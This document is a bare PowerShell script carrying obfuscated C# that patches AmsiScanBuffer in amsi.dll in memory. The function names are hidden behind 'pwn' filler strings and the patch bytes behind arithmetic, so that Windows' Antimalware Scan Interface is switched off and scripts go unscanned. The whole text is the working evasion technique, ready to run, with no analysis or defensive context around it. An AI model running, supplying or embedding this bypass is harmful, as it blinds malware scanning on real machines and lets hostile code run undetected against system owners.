$pwn=@"
using System;
using System.Runtime.InteropServices;

   public  class Program
    {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule,string procName);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,uint flNewProtect,out uint lpflOldProtect);
    public static void PWN()
    {
        String pwn = "apwnmpwnspwni.pwndpwnlpwnl";
        String pwn1 = "ApwnmpwnspwnipwnSpwncpwnapwnnpwnBpwnupwnfpwnfpwnepwnr";
        IntPtr pwn2 = LoadLibrary(pwn.Replace("pwn",""));
        IntPtr pwn3 = GetProcAddress(pwn2,pwn1.Replace("pwn",""));    
        uint perm_out = 0;
        var patch = PatchByte;
        VirtualProtect(pwn3, (UIntPtr)patch.Length, 0x40, out perm_out);
        Marshal.Copy(patch, 0, pwn3, 6);
        VirtualProtect(pwn3, (UIntPtr)patch.Length, perm_out, out perm_out);
    }
    static byte[] PatchByte
    {
        get
        {
            if (IntPtr.Size == 8)
            {
                return new byte[] { 184, 174/2 , 1892*0, 10-3, 384/3, 200 - 5 };
            }

            return new byte[] { 184, 174/2 , 1892*0, 10-3, 384/3, 150+44, 240/10,8123 * 0 };
        }
    }
}

"@
add-type $pwn
[Program]::PWN()
